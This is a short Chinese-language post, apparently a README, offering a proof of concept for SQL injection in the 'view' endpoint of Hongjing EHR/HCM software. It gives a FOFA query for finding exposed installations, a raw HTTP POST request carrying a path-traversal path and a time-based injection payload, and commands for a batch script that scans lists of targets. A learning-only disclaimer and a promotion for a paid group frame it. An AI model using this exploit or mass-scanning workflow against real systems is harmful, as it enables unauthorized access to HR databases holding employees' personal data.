# 宏景EHR view接口sql注入漏洞POC

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！

fofa：app="HJSOFT-HCM"


POST /templates/attestation/../../general/info/view HTTP/1.1
Host: xxxx
Content-Type: application/x-www-form-urlencoded

kind=1&a0100=11';WAITFOR+DELAY+'0:0:5'--

批量poc(记得安装库)

python poc.py -u 

python poc.py -f  .txt

结果保存至result.txt



## 入圈（限时体验）

![image-20240127122138808](assets/image-20240127122138808.png)

![image-20240121123620660](assets/image-20240121123620660.png)s

